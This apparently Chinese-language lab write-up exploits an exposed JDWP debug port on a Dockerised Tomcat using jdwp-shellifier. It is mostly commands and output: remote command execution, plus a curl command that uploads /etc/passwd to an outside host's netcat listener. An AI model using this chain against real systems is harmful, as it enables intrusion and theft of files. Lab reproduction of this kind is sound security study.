## Java Debugging Wire Protocol (JDWP) - Java Code Execution
#### Docker漏洞验证环境启动
```Bash
docker run --restart always --name JDWPCodeExec -p 5005:5005 -p 8080:8080 \
-e CATALINA_OPTS="-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5005" \
-d tomcat:8
```
#### 利用方法
利用工具: [jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier)
无需交互利用
```
➜  jdwp-shellifier git:(master) python jdwp-shellifier.py -t 127.0.0.1 -p 5005 --break-on "java.lang.String.indexOf"
[+] Targeting '127.0.0.1:5005'
[+] Reading settings for 'OpenJDK 64-Bit Server VM - 1.8.0_232'
[+] Found Runtime class: id=91e
[+] Found Runtime.getRuntime(): id=7f1314002bb8
[+] Created break event id=2
[+] Waiting for an event on 'java.lang.String.indexOf'
[+] Received matching event from thread 0xa08
[+] Found Java Virtual Machine specification vendor 'Oracle Corporation'
[+] Found Java Runtime Environment specification name 'Java Platform API Specification'
[+] Found Path of extension directory or directories '/usr/local/openjdk-8/jre/lib/ext:/usr/java/packages/lib/ext'
[+] Found Java Runtime Environment specification vendor 'Oracle Corporation'
[+] Found Java Virtual Machine specification version '1.8'
[+] Found Operating system name 'Linux'
[+] Found Default temp file path '/usr/local/tomcat/temp'
[+] Found User's current working directory '/usr/local/tomcat'
[+] Found Java installation directory '/usr/local/openjdk-8/jre'
[+] Found User's account name 'root'
[+] Found Java Virtual Machine implementation vendor 'Oracle Corporation'
[+] Found Java Runtime Environment vendor 'Oracle Corporation'
[+] Found Path separator ':'
[+] Found Java vendor URL 'http://java.oracle.com/'
[+] Found Java class path '/usr/local/tomcat/bin/bootstrap.jar:/usr/local/tomcat/bin/tomcat-juli.jar'
[+] Found Java Runtime Environment specification version '1.8'
[+] Found Operating system version '4.9.184-linuxkit'
[+] Found Operating system architecture 'amd64'
[+] Found Java Runtime Environment version '1.8.0_232'
[+] Found Java Virtual Machine implementation version '25.232-b09'
[+] Found Java Virtual Machine specification name 'Java Virtual Machine Specification'
[+] Found File separator '/'
[-] java.compiler: Unexpected returned type: expecting String
[+] Found Java class format version number '52.0'
[+] Found List of paths to search when loading libraries '/usr/local/tomcat/native-jni-lib:/usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib'
[+] Found Java Virtual Machine implementation name 'OpenJDK 64-Bit Server VM'
[+] Found User's home directory '/root'
[!] Command successfully executed
```

执行命令、通过curl获取对应文件内容(反弹SHELL不在此描述)
执行命令
```Bash
➜  jdwp-shellifier git:(master) python jdwp-shellifier.py -t 127.0.0.1 -p 5005 --break-on "java.lang.String.indexOf"  --cmd 'touch /tmp/jdwp'
[+] Targeting '127.0.0.1:5005'
[+] Reading settings for 'OpenJDK 64-Bit Server VM - 1.8.0_232'
[+] Found Runtime class: id=91e
[+] Found Runtime.getRuntime(): id=7fedfc002cf8
[+] Created break event id=2
[+] Waiting for an event on 'java.lang.String.indexOf'
[+] Received matching event from thread 0xa08
[+] Selected payload 'touch /tmp/jdwp'
[+] Command string object created id:a09
[+] Runtime.getRuntime() returned context id:0xa0a
[+] found Runtime.exec(): id=7fedfc002d58
[+] Runtime.exec() successful, retId=a0b
[!] Command successfully executed
```
结果
```Bash
root@9b862d4b7d71:/tmp# ls
hsperfdata_root  jdwp
```

读取文件利用
接收服务器
```Bash
nc -v -l 8080
```
利用结果
```Bash
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::8080
Ncat: Listening on 0.0.0.0:8080
Ncat: Connection from 192.168.1.3.
Ncat: Connection from 192.168.1.3:60191.
POST / HTTP/1.1
Host: 192.168.1.2:8080
User-Agent: curl/7.52.1
Accept: */*
Content-Length: 1117
Expect: 100-continue
Content-Type: multipart/form-data; boundary=------------------------cf7e24165cc794ef

--------------------------cf7e24165cc794ef
Content-Disposition: form-data; name="file"; filename="passwd"
Content-Type: application/octet-stream

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false

--------------------------cf7e24165cc794ef--
```

结果
```Bash
➜  jdwp-shellifier git:(master) python jdwp-shellifier.py -t 127.0.0.1 -p 5005 --break-on "java.lang.String.indexOf"  --cmd 'curl http://122.152.215.254:8080/ -F file=@/etc/passwd'
[+] Targeting '127.0.0.1:5005'
[+] Reading settings for 'OpenJDK 64-Bit Server VM - 1.8.0_232'
[+] Found Runtime class: id=91e
[+] Found Runtime.getRuntime(): id=7fedfc002cf8
[+] Created break event id=2
[+] Waiting for an event on 'java.lang.String.indexOf'
[+] Received matching event from thread 0xa08
[+] Selected payload 'curl http://192.168.1.2:8080/ -F file=@/etc/passwd'
[+] Command string object created id:a09
[+] Runtime.getRuntime() returned context id:0xa0a
[+] found Runtime.exec(): id=7fedfc002d58
[+] Runtime.exec() successful, retId=a0b
[!] Command successfully executed
```

参考地址：
[JDWP 远程命令执行漏洞](https://blog.csdn.net/wanzt123/article/details/82793023)
[jdwp命令执行](https://blog.csdn.net/caiqiiqi/article/details/83146415)